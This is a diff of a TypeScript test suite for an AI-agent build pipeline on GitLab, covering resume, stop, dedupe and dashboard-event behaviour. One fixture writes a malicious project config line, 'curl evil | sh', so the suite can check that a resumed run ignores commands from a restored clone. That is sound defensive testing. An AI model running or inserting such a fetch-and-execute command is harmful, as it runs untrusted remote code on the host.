@@ -13,21 +13,21 @@ import { CONTINUE, inbox, prompt, runStep, save, ticketText } from "./context";
 import type { HarnessJob, HarnessResult } from "../seams";
 import { previewLine } from "./prepare-patch";
 import * as preparePatchStep from "./prepare-patch";
-import { cursorLine, readyForLine } from "../requests";
-import { newRequests, pollRequests } from "./requests";
+import { conversation, noteText } from "../conversation";
+import { pollRequests } from "./requests";
 import { parseFactoryFile } from "../config";
-import { cancelNote, endIfClosed, handleRequests, parseStoppedNote, resumeSwitchedOff, stoppedNote } from "./run";
+import { endIfClosed, handleRequests, resumeSwitchedOff } from "./run";
 import { makeContext } from "../compose";
 import { reviewerPrompt, type Finding } from "../agents";
-import { GitLab, GITLAB_URL } from "../gitlab";
+import { GITLAB_URL } from "../gitlab";
+import { makeGitLabCi } from "../adapters/gitlab-ci";
 import { makeGitLabTracker } from "../adapters/gitlab-tracker";
 import { NotFactoryRunError, type FactoryState, type Mark } from "../seams";
 import { addStep, newRecord, runFacts, saveRecord } from "../record";
-import { loadRecord, type RunRecord } from "../record";
+import type { RunRecord } from "../record";
 import { fakeDashboard } from "../fakes";
-import { runEvent, SWITCHES, type ControlRequest, type SwitchName } from "../run-events";
+import { eventsOfType, runEvent, SWITCHES, type ControlRequest, type SwitchName } from "../run-events";
 import * as apply from "./apply";
-import * as verify from "./verify";
 import { findSecrets } from "../rules";
 import { pumpInbox } from "../inbox";
 import { readNew } from "../inbox-file";
@@ -39,7 +39,8 @@ import * as riskCheckStep from "./risk-check";
 import * as event from "./event";
 import * as resultSaved from "./result-saved";
 import * as triage from "./triage";
-import { BOT, B, PNG, TEST_PROOF, VISUAL_PROOF, fakeWorld, type WorldOptions, mrEvent, runBuildJobs, runBuildPipeline, runFinishPipeline, COMMIT } from "./test-helpers";
+import { BOT, B, noteIn, cursorOf, PNG, TEST_PROOF, VISUAL_PROOF, fakeWorld, type WorldOptions, mrEvent, runBuildJobs, runBuildPipeline, runFinishPipeline, drain, COMMIT } from "./test-helpers";
+import { retryWaiting } from "./retry-waiting";
 
 test("trivial ticket: build pipeline ends in auto-merge with no person", async () => {
   const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[]], gate: "green", jev2: "pass" }));
@@ -491,7 +492,7 @@ test("finish waits while the decision job is still running, then loads the recor
   w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", change: "5", buildRun: "41" };
   let jobPolls = 0;
   const fetchFn = (async (url: string) => {
-    const path = url.replace("https://gl.example/api/v4", "");
+    const path = url.replace(`${GITLAB_URL}/api/v4`, "");
     const body =
       path === "/projects/3/pipelines/41" ? { id: 41, source: "trigger", ref: "main", user: { id: 1 } } :
       path === "/projects/3" ? { id: 3, default_branch: "main" } :
@@ -500,8 +501,10 @@ test("finish waits while the decision job is still running, then loads the recor
       path === "/projects/3/jobs/12/artifacts/run/record.json" ? { ...w.ctx.record, workItem: "from-build" } : undefined;
     return new Response(JSON.stringify(body ?? {}), { status: body ? 200 : 404 });
   }) as unknown as typeof fetch;
-  const real = new GitLab("https://gl.example", "tok", fetchFn);
-  w.ci.buildRecord = async (run) => (await real.buildRecord(3, Number(run))) as RunRecord;
+  const secrets = tmp();
+  writeFileSync(join(secrets, "gl"), "gitlab-token-0123456789\n");
+  const real = makeGitLabCi({ CI_SERVER_URL: GITLAB_URL, CI_PROJECT_ID: "3", FACTORY_PIPELINE: "build", FACTORY_TARGET: "react_frontend", FACTORY_GITLAB_TOKEN: join(secrets, "gl") }, secrets, fetchFn);
+  w.ci.buildRecord = real.buildRecord;
   let seen = "";
   await runStep("apply", async (ctx) => ((seen = ctx.record.workItem), "next"), { dir: tmp(), make: () => w.ctx });
   expect(jobPolls).toBe(3);
@@ -511,14 +514,14 @@ test("finish waits while the decision job is still running, then loads the recor
 // Task 13: poller starts and resumed runs. Both come as trigger variables with no webhook payload.
 test("a poller start with no payload claims the run from live labels", async () => {
   const w = fakeWorld({ jev1: { risk: "trivial" } });
-  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8" };
-  await runBuildPipeline(w);
+  await w.ci.start({ kind: "build", ticket: "8" });
+  await drain(w, "build");
   expect(w.record.steps[0]).toMatchObject({ step: "event", data: { start: true, ticket: "8", actor: "dev" } });
   expect(w.finishTriggered).toBe(true);
   for (const o of [{ state: "needs_info" }, { state: "ready", actorLevel: 20 }] as WorldOptions[]) {
     const q = fakeWorld(o);
-    q.ci.vars = { ...q.ci.vars, payload: undefined, ticket: "8" };
-    await runBuildPipeline(q);
+    await q.ci.start({ kind: "build", ticket: "8" });
+    await drain(q, "build");
     expect(q.record.steps.map((s) => s.step)).toEqual(["event"]);
     expect(q.record.steps[0].data).toMatchObject({ start: false });
     expect(q.states).toEqual([o.state]);
@@ -528,10 +531,8 @@ test("a resume continues at the limited step with the saved session", async () =
   const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }));
   expect(first.workItemComments.at(-1)).toContain("Waiting run: pipeline 1");
   expect(first.workItemComments.at(-1)).toMatch(/^The author agent reached its usage limit\./); // the author may be any harness
-  const w = fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit", state: "waiting" });
-  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", buildRun: "1" };
-  w.ci.buildRecord = async () => first.record;
-  await runBuildJobs(w, tmp());
+  const w = await resumeWorld({ jev1: { risk: "trivial" } }, first);
+  await drain(w, "build");
   expect(w.restored).toEqual(["1"]);
   expect(w.jevAsked).toBe(1); // only Jev 2: triage did not run again
   expect(w.claudeRuns[0]).toMatchObject({ resume: "sess-limit" });
@@ -541,35 +542,36 @@ test("a resume continues at the limited step with the saved session", async () =
 });
 test("a resume with a forged record, a record of another work item, or no saved session blocks", async () => {
   const waitingRecord = (await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }))).record;
-  const records: (() => Promise<RunRecord>)[] = [
-    async () => { throw new NotFactoryRunError("Pipeline 1 is not a factory build pipeline"); },
-    async () => ({ ...waitingRecord, workItem: "acme/web/react_frontend#9" }),
-    async () => ({ ...waitingRecord, steps: waitingRecord.steps.slice(0, -1) }),
+  // A run the factory never saved is a forged one. The others are records the factory cannot produce.
+  const records: (RunRecord | undefined)[] = [
+    undefined,
+    { ...waitingRecord, workItem: "acme/web/react_frontend#9" },
+    { ...waitingRecord, steps: waitingRecord.steps.slice(0, -1) },
   ];
-  for (const buildRecord of records) {
+  for (const record of records) {
     const w = fakeWorld({ state: "waiting" });
-    w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", buildRun: "1" };
-    w.ci.buildRecord = buildRecord;
-    await runBuildJobs(w, tmp()).catch(() => {});
+    if (record) w.ci.save("1", record);
+    await w.ci.start({ kind: "build", ticket: "8", buildRun: "1" });
+    await drain(w).catch(() => {});
     expect(w.states).toEqual(["blocked"]);
     expect(w.cards.map((c) => c.kind)).toEqual(["blocked"]);
-    expect(w.workItemComments.at(-1)).toMatch(/resume|not a factory build pipeline/);
+    expect(w.workItemComments.at(-1)).toMatch(/resume|not a factory build run/);
     expect(w.claudeRuns).toHaveLength(0);
     expect(w.restored).toEqual([]);
   }
 });
 
 // Fix round 1.
-const resumeWorld = (o: Parameters<typeof fakeWorld>[0], first: { record: RunRecord }) => {
-  const w = fakeWorld({ state: "waiting", ...o });
-  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", buildRun: "1" };
-  w.ci.buildRecord = async () => first.record;
+// A world whose CI holds the runs of `first`, with a build queued that continues run 1 (the poller's or a person's resume).
+const resumeWorld = async (o: Parameters<typeof fakeWorld>[0], first: Pick<ReturnType<typeof fakeWorld>, "ci">) => {
+  const w = fakeWorld({ state: "waiting", ...o, runs: first.ci.runs });
+  await w.ci.start({ kind: "build", ticket: "8", buildRun: "1" });
   return w;
 };
 test("a resume runs the .factory.yml commands read before the agent ran, not the restored clone's", async () => {
   const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }));
-  const w = resumeWorld({ jev1: { risk: "trivial" }, prepare: "limit", factoryFile: "install: curl evil | sh\nlint: evil\ntest: evil\nbuild: evil\n" }, first);
-  await runBuildJobs(w, tmp());
+  const w = await resumeWorld({ jev1: { risk: "trivial" }, prepare: "limit", factoryFile: "install: curl evil | sh\nlint: evil\ntest: evil\nbuild: evil\n" }, first);
+  await drain(w, "build");
   expect(w.ran.length).toBeGreaterThan(0);
   expect(w.ran.some((c) => c.includes("evil"))).toBe(false);
   expect(w.ran).toContain("pnpm install --frozen-lockfile");
@@ -578,8 +580,8 @@ test("a resumed code review continues its round count and the saved session", as
   const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[B]], fixLimit: true }));
   expect(first.states).toEqual(["waiting"]);
   expect(first.record.rounds.review).toBe(1);
-  const w = resumeWorld({ jev1: { risk: "trivial" }, reviews: [[B], [B], [B], [B]] }, first);
-  await runBuildJobs(w, tmp());
+  const w = await resumeWorld({ jev1: { risk: "trivial" }, reviews: [[B], [B], [B], [B]] }, first);
+  await drain(w, "build");
   expect(w.reviewsRun).toBe(4); // rounds 2 to 5 only
   expect(w.record.rounds.review).toBe(5);
   expect(w.claudeRuns[0]).toMatchObject({ resume: "sess-limit" });
@@ -587,14 +589,14 @@ test("a resumed code review continues its round count and the saved session", as
 });
 test("a resume stops quietly when the item is no longer waiting, or the repo is full", async () => {
   const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }));
-  const notWaiting = resumeWorld({ state: "running" }, first);
-  await runBuildJobs(notWaiting, tmp());
+  const notWaiting = await resumeWorld({ state: "running" }, first);
+  await drain(notWaiting, "build");
   expect(notWaiting.record.steps.at(-1)?.data).toMatchObject({ start: false, reason: "not-waiting" });
   expect(notWaiting.states).toEqual(["running"]);
-  const full = resumeWorld({}, first);
+  const full = await resumeWorld({}, first);
   full.tracker.tickets.set("20", { ...full.tracker.tickets.get("9")!, ref: "20", state: "running" });
   full.tracker.tickets.set("21", { ...full.tracker.tickets.get("9")!, ref: "21", state: "stopped" }); // 3 active runs, this one included
-  await runBuildJobs(full, tmp());
+  await drain(full, "build");
   expect(full.record.steps.at(-1)?.data).toMatchObject({ start: false, reason: "repo-full" });
   for (const w of [notWaiting, full]) {
     expect(w.restored).toEqual([]);
@@ -617,9 +619,9 @@ test("a resume whose record cannot be read now waits for the next retry instead 
 test("a resume whose record is gone for good blocks with a comment and a card", async () => {
   for (const error of ["GitLab GET failed with status 404", "Pipeline 1 has no successful decision job", "Unexpected token < in JSON"]) {
     const w = fakeWorld({ state: "waiting" });
-    w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", buildRun: "1" };
     w.ci.buildRecord = async () => { throw new Error(error); };
-    await runBuildJobs(w, tmp()).catch(() => {});
+    await w.ci.start({ kind: "build", ticket: "8", buildRun: "1" });
+    await drain(w, "build").catch(() => {});
     expect(w.states, error).toEqual(["blocked"]);
     expect(w.cards.map((c) => c.kind)).toEqual(["blocked"]);
     expect(w.workItemComments.at(-1)).toContain(error);
@@ -783,8 +785,9 @@ test("the reviewer prompt holds the ticket wrapped once", async () => {
 test("a resume of a record from an older factory version blocks", async () => {
   const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }));
   const old = { ...first.record, steps: first.record.steps.map((x) => (x.step === "triage" ? { ...x, data: { ...(x.data as object), row: { author: "claude-sonnet-5-5", effort: "medium", reviewer: "tensorx-deepseek-small", mayAutoMerge: true } } } : x)) };
-  const w = resumeWorld({ jev1: { risk: "trivial" } }, { record: old });
-  await runBuildJobs(w, tmp());
+  first.ci.save("1", old);
+  const w = await resumeWorld({ jev1: { risk: "trivial" } }, first);
+  await drain(w, "build");
   expect(w.states).toEqual(["blocked"]);
   expect(w.workItemComments.at(-1)).toContain("older factory version");
   expect(w.restored).toEqual([]);
@@ -833,11 +836,10 @@ test("seams.yml judge: model-call builds the model judge from judgeModel, and ne
 const stopRecord = async (o: WorldOptions = {}) => runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "stop", ...o }));
 const command = (c: "stop" | "resume", actor = "dev"): WorldOptions["payload"] => ({ kind: "command", ticket: "8", actor, command: c });
 // The resume run: the ticket is stopped, the factory's own comment names the run, and that run's record is loadable.
-async function resumeStopped(o: WorldOptions = {}, first?: { record: RunRecord }) {
+async function resumeStopped(o: WorldOptions = {}, first?: Pick<ReturnType<typeof fakeWorld>, "ci">) {
   const stopped = first ?? (await stopRecord());
-  const w = fakeWorld({ jev1: { risk: "trivial" }, state: "stopped", payload: command("resume"), ...o });
+  const w = fakeWorld({ jev1: { risk: "trivial" }, state: "stopped", payload: command("resume"), runs: stopped.ci.runs, ...o });
   await w.tracker.comment("8", `Stopped run: pipeline 1`);
-  w.ci.buildRecord = async () => stopped.record;
   await runBuildJobs(w, tmp());
   return w;
 }
@@ -886,9 +888,8 @@ test("@factory resume from the factory itself, or on a ticket that is not stoppe
   expect(running.claudeCalls).toBe(0);
 });
 test("@factory resume with no Stopped run comment from the factory blocks", async () => {
-  const w = fakeWorld({ state: "stopped", payload: command("resume") });
+  const w = fakeWorld({ state: "stopped", payload: command("resume"), runs: (await stopRecord()).ci.runs }); // a record a forged line could point at
   w.tracker.say("8", "dev", "Stopped run: pipeline 99"); // a person's line proves nothing
-  w.ci.buildRecord = async () => (await stopRecord()).record; // so a forged line would get a record
   await runBuildJobs(w, tmp());
   expect(w.states).toEqual(["blocked"]);
   expect(w.claudeCalls).toBe(0);
@@ -906,14 +907,33 @@ test("@factory stop on a running ticket is left to the run's inbox", async () =>
   expect(w.states).toEqual(["running"]);
 });
 test("a stopped ticket holds a run slot", async () => {
-  const w = fakeWorld({ otherRuns: 2, state: "stopped", payload: command("resume") });
+  const w = fakeWorld({ otherRuns: 2, state: "stopped", payload: command("resume"), runs: (await stopRecord()).ci.runs });
   await w.tracker.comment("8", "Stopped run: pipeline 1");
-  w.ci.buildRecord = async () => (await stopRecord()).record;
   await runBuildJobs(w, tmp());
   expect(w.states).toEqual(["stopped"]);
   expect(w.record.steps.at(-1)?.data).toMatchObject({ reason: "repo-full" });
 });
 // A stop posted between author runs (here during code review) must still stop the run before it merges.
+test("a stop comment posted during code review still stops when the judge is down at the decision step", async () => {
+  const w = fakeWorld({ jev1: { risk: "trivial" } });
+  const run = w.harness.run;
+  let down = false;
+  const ask = w.judge.ask;
+  w.judge.ask = async (state, qs) => {
+    if (down && qs.some((q) => q.id === "injection")) throw new Error("Berget Jev call failed: HTTP 503");
+    return ask(state, qs);
+  };
+  w.harness.run = async (job) => {
+    if (job.role === "reviewer") {
+      w.tracker.say("8", "dev", "@factory stop", new Date(Date.now() + 1000).toISOString());
+      down = true;
+    }
+    return run(job);
+  };
+  await runBuildPipeline(w);
+  expect(w.finishTriggered).toBe(false);
+  expect(w.states).toEqual(["stopped"]); // a stopped run a person can resume, not a blocked one
+});
 test("a stop comment posted during code review leads to stopped, not a merge", async () => {
   const w = fakeWorld({ jev1: { risk: "trivial" } });
   const run = w.harness.run;
@@ -926,11 +946,10 @@ test("a stop comment posted during code review leads to stopped, not a merge", a
   expect(w.states).toEqual(["stopped"]);
   expect(w.record.steps.at(-1)).toMatchObject({ step: "decision", data: { sessionId: "sess-1", stopped: true } });
   // The resumed run polls from its own start, so the old stop is not seen again.
-  const r = fakeWorld({ jev1: { risk: "trivial" }, state: "stopped", payload: command("resume") });
+  const r = fakeWorld({ jev1: { risk: "trivial" }, state: "stopped", payload: command("resume"), runs: w.ci.runs });
   r.openChange();
   r.tracker.say("8", "dev", "@factory stop", w.record.steps.at(-1)!.at);
   await r.tracker.comment("8", "Stopped run: pipeline 1");
-  r.ci.buildRecord = async () => w.record;
   await runBuildJobs(r, tmp());
   expect(r.finishTriggered).toBe(true);
 });
@@ -958,7 +977,7 @@ test("a stop from the dashboard stops the author run and keeps its session", asy
   await runBuildPipeline(w);
   expect(w.states).toEqual(["stopped"]);
   expect(w.record.steps.at(-1)).toMatchObject({ step: "prepare-patch", data: { sessionId: "sess-d", stopped: true } });
-  expect(parseStoppedNote(w.workItemComments.at(-1)!)?.reason).toBe("stopped from the dashboard");
+  expect(noteIn(w.workItemComments.at(-1)!, "stopped")).toMatchObject({ reason: "stopped from the dashboard" });
 });
 test("a stop still stops the run when the host read for the closed check fails", async () => {
   const w = fakeWorld({ jev1: { risk: "trivial" } });
@@ -980,10 +999,10 @@ test("a watcher ticket set ready by the factory starts a run; another ticket set
   expect(other.claudeCalls).toBe(0);
   // The poller's way in: no payload, the ticket says who set it ready.
   const polled = fakeWorld({ jev1: { risk: "trivial" } });
-  polled.ci.vars = { ...polled.ci.vars, payload: undefined, ticket: "8" };
   polled.tracker.tickets.get("8")!.marks = ["watcher"];
   polled.tracker.startedBy = async () => BOT;
-  await runBuildPipeline(polled);
+  await polled.ci.start({ kind: "build", ticket: "8" });
+  await drain(polled, "build");
   expect(polled.record.steps[0]).toMatchObject({ step: "event", data: { start: true } });
 });
 
@@ -993,12 +1012,12 @@ test("a sure duplicate of an older work item is closed with a link and never bui
   expect(w.closed).toBe(true);
   expect(w.tracker.cleared).toContain("8");
   expect(w.workItemComments.at(-1)).toMatch(/same change as #7 .*https:\/\/tracker\.example\/7/s);
-  expect(w.workItemComments.at(-1)).toContain("<!-- factory:dedupe -->");
+  expect(noteIn(w.workItemComments.at(-1)!, "duplicate")?.kind).toBe("duplicate_close");
   expect(w.cloned).toEqual([]);
   expect(w.tracker.tickets.get("8")!.marks).not.toContain("triaged");
-  const [outcome] = dash(w).events.filter((e) => e.type === "triage_outcome");
+  const [outcome] = eventsOfType(dash(w).events, "triage_outcome");
   expect(outcome.data).toMatchObject({ kind: "stop", title: expect.stringContaining("duplicate of #7"), url: "https://tracker.example/7" });
-  expect((outcome.data.reasons as string[])[0]).toContain('answered "same" with 0.95 confidence');
+  expect(outcome.data.reasons[0]).toContain('answered "same" with 0.95 confidence');
 });
 test("an unsure same asks instead of closing", async () => {
   const w = await runBuildPipeline(fakeWorld({ dedupe: { verdict: "same", confidence: 0.89 } }));
@@ -1010,7 +1029,7 @@ test("a work item that adds something gets the writer's question and needs_info,
   const w = await runBuildPipeline(fakeWorld({ jev1: { clarity: 4 }, dedupe: { verdict: "adds" } }));
   expect(w.states).toEqual(["needs_info"]);
   expect(w.workItemComments.at(-1)).toContain("Does this belong in #9");
-  expect(w.workItemComments.at(-1)).toContain("<!-- factory:dedupe -->");
+  expect(noteIn(w.workItemComments.at(-1)!, "duplicate")?.kind).toBe("duplicate_question"); // F-P3: a question is not a close
   const writer = w.claudeRuns.find((j) => j.role === "writer")!;
   expect(writer.tools).toBe("none");
   expect(writer.prompt).toContain("<ticket>\n#9 Another ticket");
@@ -1046,14 +1065,19 @@ test("a writer that throws falls back to the fixed question", async () => {
 });
 test("a person who answered a dedupe comment is not asked again", async () => {
   const world = fakeWorld({ dedupe: { verdict: "adds" } });
-  await world.tracker.comment("8", `Looks close to #9.\n\n<!-- factory:dedupe -->`);
+  await world.tracker.comment("8", noteText({ kind: "duplicate_question", text: "Looks close to #9." }));
   const w = await runBuildPipeline(world);
   expect(w.dedupeAsked).toBe(0);
   expect(w.tracker.tickets.get("8")!.marks).toContain("triaged");
 });
+test("a dedupe comment posted with the old marker still counts as answered", async () => {
+  const world = fakeWorld({ dedupe: { verdict: "adds" } });
+  await world.tracker.comment("8", "Looks close to #9.\n\n<!-- factory:dedupe -->");
+  expect((await runBuildPipeline(world)).dedupeAsked).toBe(0);
+});
 test("a dedupe marker from a person does not skip the check", async () => {
   const world = fakeWorld({ dedupe: { verdict: "adds" } });
-  world.tracker.say("8", "dev", "<!-- factory:dedupe -->");
+  world.tracker.say("8", "dev", noteText({ kind: "duplicate_question", text: "x" }));
   const w = await runBuildPipeline(world);
   expect(w.dedupeAsked).toBe(1);
 });
@@ -1075,11 +1099,10 @@ test("a failed duplicate check blocks", async () => {
 });
 
 // factory_ready on a blocked ticket. The factory's block comment names run 1, and `first` is that run.
-async function readyAgain(o: WorldOptions, first: { record: RunRecord; workItemComments: string[] }, marks: Mark[] = []) {
-  const w = fakeWorld({ jev1: { risk: "trivial" }, ...o });
+async function readyAgain(o: WorldOptions, first: { ci: { runs: Map<string, RunRecord> }; workItemComments: string[] }, marks: Mark[] = []) {
+  const w = fakeWorld({ jev1: { risk: "trivial" }, ...o, runs: first.ci.runs });
   Object.assign(w.tracker.tickets.get("8")!, { ended: "blocked", marks });
   await w.tracker.comment("8", first.workItemComments.at(-1)!);
-  w.ci.buildRecord = async () => first.record;
   return w;
 }
 const marksOf = (w: { tracker: { tickets: Map<string, { marks: Mark[] }> } }) => w.tracker.tickets.get("8")!.marks;
@@ -1109,7 +1132,7 @@ test("a ready the factory set for a request more than 15 minutes ago starts no r
   vi.useFakeTimers({ toFake: ["Date"] });
   try {
     vi.setSystemTime(Date.now() - 16 * 60_000);
-    await w.tracker.comment("8", `The factory starts again.\n\n${readyForLine("dev")}`);
+    await w.tracker.comment("8", noteText({ kind: "readyFor", text: "The factory starts again.", person: "dev", cursor: T0 }));
   } finally {
     vi.useRealTimers();
   }
@@ -1159,14 +1182,16 @@ test("factory_ready starts a new run when the newest block comment names no run,
 });
 test("factory_ready starts a new run and says why when the blocked run's record cannot be continued", async () => {
   const first = await runBuildJobs(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[B], [B], [B], [B], [B]] }), tmp());
-  const cases: [() => Promise<RunRecord>, string][] = [
-    [async () => { throw new NotFactoryRunError("Pipeline 1 is not a factory build pipeline"); }, "could not be loaded (Error: Pipeline 1 is not a factory build pipeline)"],
-    [async () => ({ ...first.record, workItem: "acme/web/react_frontend#9" }), "is for another ticket"],
-    [async () => ({ ...first.record, steps: first.record.steps.slice(0, -1) }), "does not show which step blocked"],
+  // A run the factory never saved is refused. The others are records the factory cannot produce.
+  const cases: [RunRecord | undefined, string][] = [
+    [undefined, "could not be loaded (Error: Run 1 is not a factory build run)"],
+    [{ ...first.record, workItem: "acme/web/react_frontend#9" }, "is for another ticket"],
+    [{ ...first.record, steps: first.record.steps.slice(0, -1) }, "does not show which step blocked"],
   ];
-  for (const [buildRecord, why] of cases) {
+  for (const [record, why] of cases) {
     const w = await readyAgain({}, first);
-    w.ci.buildRecord = buildRecord;
+    if (record) w.ci.save("1", record);
+    else w.ci.runs.delete("1");
     await runBuildJobs(w, tmp());
     expect(w.workItemComments.filter((c) => c.includes("starts a new run"))).toEqual([`The factory starts a new run, because it cannot continue the blocked run: the record of pipeline 1 ${why}.`]);
     expect(w.restored).toEqual([]);
@@ -1182,7 +1207,7 @@ test("a crash block names no run, so factory_ready after it starts a new run wit
   await expect(runBuildJobs(crashed, tmp())).rejects.toThrow("reviewer crashed");
   expect(crashed.workItemComments.at(-1)).toBe("The factory stopped. A person must look at this.\n\nThe code-review step failed: Error: reviewer crashed");
   const w = await readyAgain({}, crashed);
-  w.ci.buildRecord = async () => { throw new Error("Pipeline 1 has no successful decision job"); };
+  expect(w.ci.runs.has("1")).toBe(false); // the crashed run saved no record
   await runBuildJobs(w, tmp());
   expect(w.workItemComments.filter((c) => c.includes("starts a new run"))).toEqual([]);
   expect(w.jevAsked).toBe(3); // triage and the duplicate check ran again
@@ -1193,7 +1218,8 @@ test("a run continued at risk-check puts its own run on the change, so a person'
   const first = fakeWorld({ jev1: { risk: "medium" } });
   first.host.checks = async () => { throw new Error("GitLab GET failed with status 500"); };
   await runBuildJobs(first, tmp()).catch(() => {});
-  const w = await readyAgain({ jev1: { risk: "medium" } }, { record: first.record, workItemComments: ["The factory stopped. A person must look at this.\n\nThe risk-check step failed.\n\nBlocked run: pipeline 1"] });
+  first.ci.save("1", first.record); // a record the factory would not produce: a crashed run saves none
+  const w = await readyAgain({ jev1: { risk: "medium" } }, { ci: first.ci, workItemComments: ["The factory stopped. A person must look at this.\n\nThe risk-check step failed.\n\nBlocked run: pipeline 1"] });
   w.openChange("Factory run 1: https://ci.example/runs/1");
   w.ci.vars = { ...w.ci.vars, run: "2", runUrl: "https://ci.example/runs/2" };
   await runBuildJobs(w, tmp());
@@ -1277,8 +1303,8 @@ test("a check-only gate after a review fix counts 5 rounds, not 6", async () => 
 test("a resumed gate job reviews the change again", async () => {
   const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, lintFails: 1, fixLimit: true }));
   expect(first.states).toEqual(["waiting"]);
-  const w = resumeWorld({ jev1: { risk: "trivial" }, reviews: [[]] }, first);
-  await runBuildJobs(w, tmp());
+  const w = await resumeWorld({ jev1: { risk: "trivial" }, reviews: [[]] }, first);
+  await drain(w, "build");
   expect(w.reviewsRun).toBe(1);
   expect(w.finishTriggered).toBe(true);
 });
@@ -1442,13 +1468,8 @@ test("makeContext needs the dashboard token and a real dashboardUrl", () => {
 const dash = (w: ReturnType<typeof fakeWorld>) => w.ctx.dashboard as ReturnType<typeof fakeDashboard>;
 // The whole run as CI runs it: the build jobs, then the finish jobs that load the build record.
 async function runAllJobs(w: ReturnType<typeof fakeWorld>) {
-  const buildDir = tmp();
-  await runBuildJobs(w, buildDir);
-  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", change: "5", buildRun: "1", run: "2" };
-  w.ci.buildRecord = async () => loadRecord(buildDir);
-  const finishDir = tmp();
-  for (const [name, s] of [["apply", apply], ["verify", verify], ["result-saved", resultSaved]] as const) await runStep(name, s.run, { dir: finishDir, make: () => w.ctx });
-  return w;
+  await runBuildJobs(w, tmp());
+  return drain(w);
 }
 test("a low-risk run sends run_start, a start and an end per step, usage, Jev answers, the decision and run_end done, all with one run ID", async () => {
   const w = await runAllJobs(fakeWorld({ jev1: { risk: "low" } }));
@@ -1465,9 +1486,9 @@ test("a low-risk run sends run_start, a start and an end per step, usage, Jev an
   expect(new Set(events.filter((e) => e.type === "jev_answer").map((e) => e.step))).toEqual(new Set(["triage", "risk-check"]));
   expect(events.filter((e) => e.type === "triage_outcome").map((e) => e.data.kind)).toEqual(["go"]);
   expect(events.filter((e) => e.type === "decision").map((e) => e.data)).toEqual([{ auto: true, reasons: [], risk: 3, riskMax: 4, changeUrl: "https://host.example/changes/5" }]);
-  expect(events.filter((e) => e.type === "label_change").at(-1)?.data).toEqual({ to: "factory_done" });
+  expect(eventsOfType(events, "label_change").at(-1)?.data).toEqual({ to: "done" });
   // run_end is the last event of the run; only its own step's end comes after it.
-  expect(events.slice(-2).map((e) => [e.type, e.data.outcome])).toEqual([["run_end", "done"], ["step_end", "next"]]);
+  expect(events.slice(-2).map((e) => [e.type, "outcome" in e.data ? e.data.outcome : undefined])).toEqual([["run_end", "done"], ["step_end", "next"]]);
   // Every event passes the dashboard's own check.
   for (const e of events) expect(runEvent.safeParse(e).success, e.type).toBe(true);
 });
@@ -1476,8 +1497,8 @@ test("a resumed run keeps the run ID of the run it continues", async () => {
   await runBuildJobs(first, tmp());
   const runId = first.record.runId;
   expect(runId).toBeDefined();
-  const w = resumeWorld({ jev1: { risk: "trivial" } }, first);
-  await runBuildJobs(w, tmp());
+  const w = await resumeWorld({ jev1: { risk: "trivial" } }, first);
+  await drain(w, "build");
   expect(w.finishTriggered).toBe(true);
   expect(w.record.runId).toBe(runId);
   expect(dash(w).events.length).toBeGreaterThan(0);
@@ -1515,15 +1536,6 @@ test("a declined @factory resume sends no step start or end to the old run", asy
   expect(w.record.steps.at(-1)).toMatchObject({ step: "event", data: { start: false, reason: "repo-full" } });
   expect(dash(w).events.filter((e) => e.type === "step_start" || e.type === "step_end")).toEqual([]);
 });
-test("a successful @factory resume sends one paired start and end for the event step", async () => {
-  const first = await runBuildJobs(fakeWorld({ jev1: { risk: "trivial" }, prepare: "stop" }), tmp());
-  const w = await resumeStopped({}, first);
-  expect(w.finishTriggered).toBe(true);
-  const ev = dash(w).events.filter((e) => e.step === "event" && (e.type === "step_start" || e.type === "step_end"));
-  expect(ev.map((e) => e.type)).toEqual(["step_start", "step_end"]);
-  expect(new Set(dash(w).events.map((e) => e.run))).toEqual(new Set([first.record.runId]));
-});
-
 // Task B3: author tool calls go to the dashboard under the step; usage carries the cache and context tokens.
 test("an author's tool calls are sent as tool_call events under their step, a reviewer's are not asked for, and usage has the cache tokens", async () => {
   const w = await runAllJobs(fakeWorld({ jev1: { risk: "low" } }));
@@ -1549,8 +1561,8 @@ test("an author's tool calls are sent as tool_call events under their step, a re
 test("a review fix and a gate fix each send a patch step that owns the fix's tool calls and usage", async () => {
   const w = await runAllJobs(fakeWorld({ jev1: { risk: "trivial" }, lintFails: 1, reviews: [[B], [], []] }));
   const events = dash(w).events;
-  const patches = events.filter((e) => e.type === "step_start" && e.step === "patch");
-  const starts = events.filter((e) => e.type === "step_start");
+  const patches = eventsOfType(events, "step_start").filter((e) => e.step === "patch");
+  const starts = eventsOfType(events, "step_start");
   expect(patches.map((p) => starts.slice(0, starts.indexOf(p)).filter((e) => e.step !== "patch").at(-1)?.step)).toEqual(["code-review", "precommit-gate"]);
   expect(patches.every((p) => typeof p.data.prompt === "string" && p.data.prompt.length > 0)).toBe(true);
   expect(stepEnds(w).filter(([s]) => s === "patch")).toEqual([["patch", "next"], ["patch", "next"]]);
@@ -1586,8 +1598,8 @@ test("prepare_patch off stops the run before any author job, and turning it on r
   dash(first).down = false;
   expect(await resumeSwitchedOff(first.ctx)).toEqual(["8"]);
   expect(first.ci.started.at(-1)).toEqual({ kind: "build", ticket: "8", buildRun: "1" });
-  const w = resumeWorld({ jev1: { risk: "trivial" }, state: "stopped" }, first);
-  await runBuildJobs(w, tmp());
+  const w = await resumeWorld({ jev1: { risk: "trivial" }, state: "stopped" }, first);
+  await drain(w, "build");
   expect(w.restored).toEqual(["1"]);
